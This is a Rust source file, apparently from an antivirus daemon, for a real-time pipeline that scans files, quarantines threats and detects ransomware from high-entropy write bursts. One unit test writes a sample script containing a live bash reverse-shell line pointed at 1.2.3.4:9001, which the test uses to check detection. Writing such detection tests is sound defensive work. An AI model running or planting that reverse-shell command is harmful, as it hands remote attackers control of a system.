//! The real-time pipeline: consume [`WatchEvent`]s, scan the file, and react.
//!
//! This is deliberately decoupled from the event *source* (inotify/fanotify) so
//! the whole detect-and-respond path can be unit-tested by feeding synthetic
//! events through a channel — no kernel privileges required.

use crate::state::DaemonState;
use aegis_behavior::ransomware::{EventType, RansomwareConfig, RansomwareGuard};
use aegis_behavior::{response, AlertReason};
use aegis_core::now_epoch;
use aegis_engine::shannon_entropy;
use aegis_quarantine::Quarantine;
use std::sync::atomic::Ordering;
use std::sync::Arc;
use std::time::Instant;
use tokio::sync::{mpsc, Mutex};

use super::{EventKind, WatchEvent};

/// Drives the scan/response pipeline for real-time events.
pub struct Monitor {
    state: Arc<DaemonState>,
    auto_quarantine: bool,
    /// Ransomware behavioural guard (present when enabled in config).
    guard: Option<Mutex<RansomwareGuard>>,
    ransomware_auto_kill: bool,
    start: Instant,
}

impl Monitor {
    pub fn new(state: Arc<DaemonState>, auto_quarantine: bool) -> Self {
        Self {
            state,
            auto_quarantine,
            guard: None,
            ransomware_auto_kill: false,
            start: Instant::now(),
        }
    }

    /// Enable the ransomware behavioural guard with the given config.
    pub fn with_ransomware(mut self, cfg: RansomwareConfig, auto_kill: bool) -> Self {
        self.guard = Some(Mutex::new(RansomwareGuard::new(cfg)));
        self.ransomware_auto_kill = auto_kill;
        self
    }

    /// Consume events until the channel closes. Each event is scanned on a
    /// blocking thread pool so a slow scan never stalls the async runtime.
    pub async fn run(self, mut rx: mpsc::Receiver<WatchEvent>) {
        tracing::info!("real-time monitor started");
        while let Some(event) = rx.recv().await {
            self.state.rt_events.fetch_add(1, Ordering::Relaxed);
            self.handle(event).await;
        }
        tracing::info!("real-time monitor stopped");
    }

    async fn handle(&self, event: WatchEvent) {
        // Behavioural (ransomware) observation first — it needs to see *every*
        // event, including writes to files the signature engines call clean.
        if self.guard.is_some() {
            self.observe_ransomware(&event).await;
        }

        let state = self.state.clone();
        let path = event.path.clone();
        // Run the (CPU/IO-bound) scan off the async reactor.
        let verdict = tokio::task::spawn_blocking(move || {
            let scanner = state.scanner();
            scanner.scan_file(&path)
        })
        .await;

        let verdict = match verdict {
            Ok(v) => v,
            Err(e) => {
                tracing::error!(error = %e, "real-time scan task panicked");
                return;
            }
        };

        if !verdict.is_threat() {
            return;
        }

        let top = verdict.top_detection().cloned();
        let names = verdict.threat_names();
        tracing::warn!(
            path = %verdict.path.display(),
            threat = %names,
            "real-time threat detected"
        );

        // Persist to history under the "realtime" kind.
        let repo = self.state.db.scans();
        if let Ok(scan_id) = repo.insert_scan(
            now_epoch(),
            now_epoch(),
            &verdict.path.to_string_lossy(),
            1,
            1,
            "realtime",
        ) {
            for d in &verdict.detections {
                let _ = repo.insert_threat(
                    scan_id,
                    now_epoch(),
                    &verdict.path.to_string_lossy(),
                    &verdict.sha256,
                    &d.threat,
                    &d.engine,
                    d.severity as i64,
                    if self.auto_quarantine {
                        "quarantined"
                    } else {
                        "detected"
                    },
                );
            }
        }
        self.state.threats_found.fetch_add(1, Ordering::Relaxed);

        // Optionally neutralize immediately.
        if self.auto_quarantine {
            if let Some(top) = top {
                match Quarantine::open(&self.state.db) {
                    Ok(q) => {
                        match q.quarantine(
                            &verdict.path,
                            &verdict.sha256,
                            &top.threat,
                            &top.engine,
                            verdict.severity() as i64,
                            now_epoch(),
                        ) {
                            Ok(_) => {
                                self.state.rt_blocked.fetch_add(1, Ordering::Relaxed);
                                tracing::warn!(
                                    path = %verdict.path.display(),
                                    "real-time threat quarantined"
                                );
                            }
                            Err(e) => tracing::error!(error = %e, "auto-quarantine failed"),
                        }
                    }
                    Err(e) => tracing::error!(error = %e, "cannot open quarantine vault"),
                }
            }
        }
    }

    /// Feed one event to the ransomware guard and act on any alert.
    async fn observe_ransomware(&self, event: &WatchEvent) {
        let Some(guard) = &self.guard else { return };

        // Renames-in (MOVED_TO) count as renames; writes count as writes.
        let kind = match event.kind {
            EventKind::MovedIn => EventType::Rename,
            EventKind::Written => EventType::Write,
            EventKind::Opened => return,
        };

        // Compute the content entropy of the file (first 64 KiB) for writes.
        let entropy = if kind == EventType::Write {
            file_head_entropy(&event.path)
        } else {
            0.0
        };
        let now_ms = self.start.elapsed().as_millis() as u64;

        let alert = {
            let mut g = guard.lock().await;
            g.observe(&event.path, kind, entropy, event.pid, now_ms)
        };
        let Some(alert) = alert else { return };

        let reason = match alert.reason {
            AlertReason::MassEncryption => "mass-encryption",
            AlertReason::RenameStorm => "rename-storm",
            AlertReason::CanaryTripped => "canary-tripped",
            AlertReason::ShadowCopyDeletion => "shadow-copy-deletion",
        };
        tracing::error!(
            reason,
            writes = alert.writes_in_window,
            high_entropy = alert.high_entropy_writes,
            pid = ?alert.pid,
            "RANSOMWARE behaviour detected"
        );
        self.state.threats_found.fetch_add(1, Ordering::Relaxed);

        // Record to history.
        let repo = self.state.db.scans();
        if let Ok(scan_id) = repo.insert_scan(
            now_epoch(),
            now_epoch(),
            &event.path.to_string_lossy(),
            alert.writes_in_window as i64,
            1,
            "ransomware",
        ) {
            let _ = repo.insert_threat(
                scan_id,
                now_epoch(),
                &event.path.to_string_lossy(),
                "",
                &format!("Ransomware.{reason}"),
                "Behavior",
                aegis_core::Severity::Critical as i64,
                if self.ransomware_auto_kill && alert.pid.is_some() {
                    "killed"
                } else {
                    "detected"
                },
            );
        }

        // Active response: kill the offending process when attributable.
        if self.ransomware_auto_kill {
            if let Some(pid) = alert.pid {
                match response::kill_pid(pid) {
                    Ok(()) => {
                        self.state.rt_blocked.fetch_add(1, Ordering::Relaxed);
                        tracing::error!(pid, "killed ransomware process");
                    }
                    Err(e) => tracing::error!(pid, error = %e, "failed to kill process"),
                }
            } else {
                tracing::warn!(
                    "ransomware detected but process is unattributed (inotify \
                     backend cannot kill; use fanotify for prevention)"
                );
            }
        }
    }
}

/// Shannon entropy of a file's first 64 KiB (0.0 if unreadable/empty).
fn file_head_entropy(path: &std::path::Path) -> f64 {
    use std::io::Read;
    let Ok(mut f) = std::fs::File::open(path) else {
        return 0.0;
    };
    let mut buf = vec![0u8; 64 * 1024];
    match f.read(&mut buf) {
        Ok(n) if n > 0 => shannon_entropy(&buf[..n]),
        _ => 0.0,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::realtime::EventKind;
    use aegis_behavior::ransomware::RansomwareConfig;
    use aegis_core::{Config, Whitelist};
    use aegis_storage::Database;

    #[tokio::test]
    async fn realtime_pipeline_detects_and_quarantines() {
        let tmp = tempfile::tempdir().unwrap();
        // Write a malicious script into the watched area.
        let victim = tmp.path().join("evil.sh");
        std::fs::write(
            &victim,
            b"#!/bin/bash\nbash -i >& /dev/tcp/1.2.3.4/9001 0>&1\n",
        )
        .unwrap();

        let db = Arc::new(Database::open_in_memory().unwrap());
        let state = DaemonState::new(Config::default(), Whitelist::default(), db);

        // Feed one synthetic event through the pipeline with auto-quarantine on.
        let (tx, rx) = mpsc::channel(4);
        let monitor = Monitor::new(state.clone(), true);
        let handle = tokio::spawn(monitor.run(rx));

        tx.send(WatchEvent {
            path: victim.clone(),
            kind: EventKind::Written,
            pid: None,
        })
        .await
        .unwrap();
        drop(tx); // close channel so run() returns
        handle.await.unwrap();

        // Threat recorded and file neutralized (moved to the vault).
        assert_eq!(state.threats_found.load(Ordering::Relaxed), 1);
        assert_eq!(state.rt_blocked.load(Ordering::Relaxed), 1);
        assert!(
            !victim.exists(),
            "auto-quarantine should remove the original"
        );
        assert_eq!(state.db.quarantine().all().unwrap().len(), 1);
    }

    #[tokio::test]
    async fn realtime_ignores_clean_files() {
        let tmp = tempfile::tempdir().unwrap();
        let ok = tmp.path().join("notes.txt");
        std::fs::write(&ok, b"perfectly ordinary text").unwrap();

        let db = Arc::new(Database::open_in_memory().unwrap());
        let state = DaemonState::new(Config::default(), Whitelist::default(), db);

        let (tx, rx) = mpsc::channel(4);
        let monitor = Monitor::new(state.clone(), true);
        let handle = tokio::spawn(monitor.run(rx));
        tx.send(WatchEvent {
            path: ok,
            kind: EventKind::Written,
            pid: None,
        })
        .await
        .unwrap();
        drop(tx);
        handle.await.unwrap();

        assert_eq!(state.threats_found.load(Ordering::Relaxed), 0);
    }

    #[tokio::test]
    async fn ransomware_guard_trips_on_encryption_burst() {
        let tmp = tempfile::tempdir().unwrap();
        let db = Arc::new(Database::open_in_memory().unwrap());
        let state = DaemonState::new(Config::default(), Whitelist::default(), db);

        // Tight thresholds so a short burst trips within the test.
        let cfg = RansomwareConfig {
            window_ms: 60_000,
            max_writes: 8,
            entropy_threshold: 7.0,
            min_high_entropy: 5,
            rename_storm: 5,
        };
        let monitor = Monitor::new(state.clone(), false).with_ransomware(cfg, false);

        let (tx, rx) = mpsc::channel(64);
        let handle = tokio::spawn(monitor.run(rx));

        // Simulate encryption: write high-entropy (random) content to many files.
        for i in 0..10 {
            let p = tmp.path().join(format!("file{i}.dat"));
            let bytes: Vec<u8> = (0..4096u32)
                .map(|n| (n.wrapping_mul(2654435761) >> 13) as u8)
                .collect();
            std::fs::write(&p, &bytes).unwrap();
            tx.send(WatchEvent {
                path: p,
                kind: EventKind::Written,
                pid: None,
            })
            .await
            .unwrap();
        }
        drop(tx);
        handle.await.unwrap();

        // The behavioural guard should have recorded a ransomware threat.
        assert!(state.threats_found.load(Ordering::Relaxed) >= 1);
        let threats = state.db.scans().recent_threats(10).unwrap();
        assert!(threats.iter().any(|t| t.threat.starts_with("Ransomware")));
    }
}
